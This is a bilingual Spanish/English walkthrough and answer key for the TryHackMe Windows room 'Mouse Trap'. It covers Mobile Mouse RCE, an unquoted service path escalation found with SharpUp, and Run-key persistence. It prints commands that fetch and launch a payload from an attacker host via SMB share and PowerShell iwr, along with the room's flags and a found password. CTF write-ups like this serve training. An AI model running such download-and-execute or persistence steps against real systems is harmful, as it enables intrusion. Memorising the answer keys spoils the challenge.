# Mouse Trap

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | walkthrough (boT2root / Windows) | `mousetrap` | https://tryhackme.com/room/mousetrap | 01 Level Easy | TryHackMe | Servicio Mobile Mouse / SharpUp / abuso de ruta de servicio / PowerShell / Run key (HKCU) | Explotación de la utilidad Mobile Mouse en Windows: RCE, escalada de privilegios local y persistencia vía registro. |

---

**Contexto:** Sala de explotación Windows centrada en la herramienta *Mobile Mouse* (servicio `HelperService.exe` con la ruta `C:\Program Files (x86)\Mobile Mouse\Mouse" Utilities\HelperService.exe`). El atacante despliega un `payload.exe`, lanza una tarea programada/comando para iniciarlo desde un share (`cmd.exe /c start /B\\10.10.205.235\share\payload.exe`) y usa `.\SharpUp.exe audit` para detectar rutas de servicio aprovechables. Se identifica la contraseña `chazy??123`, se establece persistencia en la clave `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` apuntando a `C:\Users\Public\admin.exe`, y se recuperan tres flags y una fecha/hora exacta de actividad (`8/6/2024 4:14:43 PM`). Todo el payload se conserva verbatim.

> **ES:** Abusar del servicio Mobile Mouse (ruta sin comillas), escalar privilegios con SharpUp y persistir vía Run key hasta leer las flags.
> **EN:** Abuse the Mobile Mouse service (unquoted path), escalate privileges with SharpUp and persist via the Run key until the flags are read.

## Solucionario

### Task 1: Flags de la sala / Room flags

**Explicación:** A lo largo del reto se recuperan tres flags: `THM{Terry_mouse_2_rce}` (primera fase de RCE), `THM{Terry_1s_th3_4dm1n_n0w}` (escalada a administrador) y `THM{Mouse_Trouble_#4344#}` (fase final). Se conservan verbatim.

Contenido original de la tarea / Original task content:

```text
1. 1. THM{Terry_mouse_2_rce}
   2. THM{Terry_1s_th3_4dm1n_n0w}
   3. THM{Mouse_Trouble_#4344#}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de la fase RCE / RCE phase flag | `THM{Terry_mouse_2_rce}` |
| 2 | Flag de la fase administrador / Admin phase flag | `THM{Terry_1s_th3_4dm1n_n0w}` |
| 3 | Flag de la fase final / Final phase flag | `THM{Mouse_Trouble_#4344#}` |

### Task 2: Escalada y persistencia / Escalation & persistence

**Explicación:** La segunda tarea documenta la fase activa sobre la víctima: el binario entregado (`payload.exe`), la IP del atacante/entorno (`10.10.205.235`), el comando que lo lanza desde el share (`cmd.exe /c start /B\\10.10.205.235\share\payload.exe`), la auditoría de privilegios con `.\SharpUp.exe audit`, la marca temporal exacta (`8/6/2024 4:14:43 PM`), la descarga alternativa vía PowerShell (`powershell iwr http://10.10.205.235:1234/payload.exe -outfile Mouse.exe`), el servicio vulnerable en su ruta completa (`"C:\Program Files (x86)\Mobile Mouse\Mouse" Utilities\HelperService.exe`), la contraseña hallada (`chazy??123`), la clave de persistencia (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) y el binario de persistencia (`C:\Users\Public\admin.exe`). Todo se conserva verbatim.

Contenido original de la tarea / Original task content:

```text
2. 1. payload.exe
   2. 10.10.205.235
   3. cmd.exe /c start /B\\10.10.205.235\share\payload.exe
   4. .\SharpUp.exe audit
   5. 8/6/2024 4:14:43 PM
   6. powershell iwr http://10.10.205.235:1234/payload.exe -outfile Mouse.exe
   7. "C:\Program Files (x86)\Mobile Mouse\Mouse” Utilities\HelperService.exe
   8. chazy??123
   9. HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   10. C:\Users\Public\admin.exe
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Payload entregado / Payload dropped | `payload.exe` |
| 2 | IP del atacante/entorno / Attacker/environment IP | `10.10.205.235` |
| 3 | Comando de ejecución desde el share / Share execution command | `cmd.exe /c start /B\\10.10.205.235\share\payload.exe` |
| 4 | Herramienta de auditoría de escalada / Escalation audit tool | `.\SharpUp.exe audit` |
| 5 | Marca temporal del evento / Event timestamp | `8/6/2024 4:14:43 PM` |
| 6 | Descarga alternativa vía PowerShell / Alternative PowerShell download | `powershell iwr http://10.10.205.235:1234/payload.exe -outfile Mouse.exe` |
| 7 | Servicio vulnerable (ruta completa) / Vulnerable service (full path) | `"C:\Program Files (x86)\Mobile Mouse\Mouse” Utilities\HelperService.exe` |
| 8 | Contraseña encontrada / Password found | `chazy??123` |
| 9 | Clave de persistencia / Persistence key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| 10 | Binario de persistencia / Persistence binary | `C:\Users\Public\admin.exe` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de la fase RCE / RCE phase flag | `THM{Terry_mouse_2_rce}` |
| 2 | Flag de la fase administrador / Admin phase flag | `THM{Terry_1s_th3_4dm1n_n0w}` |
| 3 | Flag de la fase final / Final phase flag | `THM{Mouse_Trouble_#4344#}` |
| 4 | Payload entregado / Payload dropped | `payload.exe` |
| 5 | IP del atacante/entorno / Attacker/environment IP | `10.10.205.235` |
| 6 | Comando de ejecución desde el share / Share execution command | `cmd.exe /c start /B\\10.10.205.235\share\payload.exe` |
| 7 | Herramienta de auditoría de escalada / Escalation audit tool | `.\SharpUp.exe audit` |
| 8 | Marca temporal del evento / Event timestamp | `8/6/2024 4:14:43 PM` |
| 9 | Descarga alternativa vía PowerShell / Alternative PowerShell download | `powershell iwr http://10.10.205.235:1234/payload.exe -outfile Mouse.exe` |
| 10 | Servicio vulnerable (ruta completa) / Vulnerable service (full path) | `"C:\Program Files (x86)\Mobile Mouse\Mouse” Utilities\HelperService.exe` |
| 11 | Contraseña encontrada / Password found | `chazy??123` |
| 12 | Clave de persistencia / Persistence key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| 13 | Binario de persistencia / Persistence binary | `C:\Users\Public\admin.exe` |

---

**Metodología:** Obtener RCE inicial sobre la máquina Windows (flags 1-3 según la fase), identificar el servicio Mobile Mouse con ruta no citada, auditar con SharpUp, explotar la ruta/servicio para escalar privilegios, recuperar la contraseña (`chazy??123`), y establecer persistencia escribiendo en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` un binario (`C:\Users\Public\admin.exe`) que se ejecute al iniciar sesión.

### Cadena de ataque / Attack Chain

```text
Acceso inicial -> payload.exe -> cmd.exe /c start /B\\10.10.205.235\share\payload.exe -> .\SharpUp.exe audit -> servicio Mobile Mouse (ruta sin comillas) -> escalada -> administrador -> persistencia en HKCU\...\Run -> C:\Users\Public\admin.exe -> flags
```

**Learning chain:** RCE -> despliegue de payload -> SharpUp (enumeración de privilegios) -> abuso de servicio (unquoted path) -> escalada a admin -> Run key (persistencia) -> flags.

**Lección:** *Los servicios con rutas sin comillas y los Run Keys son vectores clásicos de escalada y persistencia en Windows; la auditoría con SharpUp los expone de forma rápida.* 

**MITRE ATT&CK:** T1543.003 (Create or Modify System Process: Windows Service), T1547.001 (Boot/Logon Autostart Execution: Registry Run Keys), T1059.001 (PowerShell), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - Mouse Trap](https://tryhackme.com/room/mousetrap)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.